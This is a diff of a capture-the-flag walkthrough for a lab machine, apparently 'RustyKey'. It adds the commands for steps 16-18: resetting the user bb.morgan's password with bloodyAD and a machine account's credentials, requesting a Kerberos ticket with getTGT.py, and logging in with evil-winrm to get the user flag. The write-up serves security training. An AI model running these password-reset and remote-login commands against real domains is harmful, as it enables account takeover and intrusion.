@@ -97,15 +97,15 @@
 
 16. Now change bb.morgan's password using IT-Computer3$'s creds
 
-``
+`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' set password bb.morgan Password123`
 
 17. Changed! Now we can request a Ticket Granting Ticket with bb.morgan's credentials using impacket's getTGT.py script
 
-``
+`getTGT.py -dc-ip dc.rustykey.htb rustykey.htb/bb.morgan:Password123`
 
 18. Finally, add the path to the ticket to the KRB5CCNAME environment variable and log into the machine using evil-winrm with kerberos authentication
 
-``
+`evil-winrm -i dc.rustykey.htb -u bb.morgan -p Password123 -r rustykey.htb`
 
 19. Got the user flag!!!
 
